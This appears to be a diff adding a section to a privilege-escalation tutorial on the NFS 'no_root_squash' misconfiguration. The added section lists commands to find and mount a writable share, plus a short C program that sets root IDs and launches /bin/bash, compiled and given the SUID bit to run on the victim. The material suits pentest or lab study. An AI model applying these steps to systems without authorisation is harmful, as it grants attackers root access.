@@ -89,3 +89,35 @@ NFS (Network File Sharing) configuration is kept in the /etc/exports file. This 
 ![image](img/shell.png)
 
 The critical element for this privilege escalation vector is the “no_root_squash”. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+### On atacker's machine
+
+Start bash with sudo privilages<br>
+`sudo su`
+
+We can start enumerating mountable shares <br>
+`showmount -e <ip>`
+
+Make dir in /tmp and mount it
+<pre>mkdir /tmp/attack
+
+mount -o rw IP:/path /tmp/attack </pre>
+
+nfs.c script for bash
+<pre>
+int main(){
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+</pre>
+
+compile it and give it root bit flag
+<pre>
+gcc nfs.c -o nfs -w
+
+chmod +s nfs
+</pre>
+
+Then you can run it on victim's machine
